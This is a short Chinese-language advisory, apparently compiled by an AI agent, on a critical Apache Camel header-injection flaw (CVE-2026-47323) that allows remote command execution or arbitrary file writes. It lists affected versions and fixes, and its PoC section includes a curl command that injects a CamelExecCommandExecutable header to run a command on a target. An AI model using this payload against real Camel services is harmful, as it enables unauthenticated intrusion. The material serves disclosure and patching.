**文章来源为：AI agent 自动采集整理**

**严重程度：** Critical
**影响版本：** Apache Camel 3.18.0-4.14.5, 4.15.0-4.18.1
**公开日期：** 2026-07-17

### 漏洞描述
Apache Camel 的 CXF-RS/CXF-SOAP/Knative HeaderFilterStrategy 仅配置了出站过滤（setOutFilterStartsWith），未配置入站过滤（setInFilterStartsWith）。未认证攻击者可通过 HTTP 请求注入 Camel 内部 header（如 CamelExecCommandExecutable、CamelFileName），当路由转发到 camel-exec 或 camel-file 组件时，注入的 header 覆盖配置值，实现 RCE 或任意文件写入。

### POC/利用
```bash
# Apache 官方 reproducer
git clone https://github.com/oscerd/CVE-2026-47323
cd CVE-2026-47323 && docker-compose up

# 攻击: 注入 CamelExecCommandExecutable header
curl -H "CamelExecCommandExecutable: id" http://target:9000/service/api/ping
# 结果: 命令 "id" 的输出替代原始 "echo hello"
```

### 修复建议
1. 升级到 4.14.6 / 4.18.2 / 4.19.0
2. 添加 setInFilterStartsWith(CAMEL_FILTER_STARTS_WITH) 配置
